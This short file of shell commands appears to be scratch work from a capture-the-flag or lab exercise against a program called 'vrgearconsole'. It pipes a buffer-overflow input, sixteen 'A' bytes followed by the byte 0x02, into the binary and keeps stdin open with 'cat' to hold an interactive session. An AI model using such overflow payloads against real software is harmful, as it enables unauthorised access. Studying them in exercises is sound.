#cat file - | vrgearconsole
#python3 -c "print ('A'*16+'\x02')" | ./vrgearconsole

(python3 -c "print ('A'*16+'\x02')" && cat) | ./vrgearconsole